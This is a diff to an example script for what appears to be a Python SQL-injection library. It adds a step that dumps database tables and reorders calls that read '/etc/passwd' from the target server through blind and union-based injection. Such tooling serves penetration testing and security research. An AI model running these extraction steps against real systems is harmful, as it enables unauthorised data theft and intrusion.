@@ -2,7 +2,7 @@
 
 import requests
 
-from pysqli import SqliEncoder
+from pysqli import SqliEncoder, DbDumper
 from pysqli.blind_tester import BlindTester
 from pysqli.blind_string_finder import BlindStringFinder
 from pysqli.star_extract import StarExtract
@@ -17,9 +17,13 @@ tester = BlindTester(
 sf = BlindStringFinder(tester)
 
 sf.read_string("(SELECT {})".format(SqliEncoder.str_to_hexa('coucou')))
-print(sf.read_file('/etc/passwd'))
+
 
 print(sf.read_string("(SELECT version())"))
+
+dd = DbDumper(sf)
+
+print(dd.tables())
 
 print('-' * 15 + 'Find by union' + '-' * 15)
 
@@ -31,3 +35,4 @@ print(usf.read_string('(SELECT version())'))
 
 print(usf.read_file('/etc/passwd'))
 
+print(sf.read_file('/etc/passwd'))
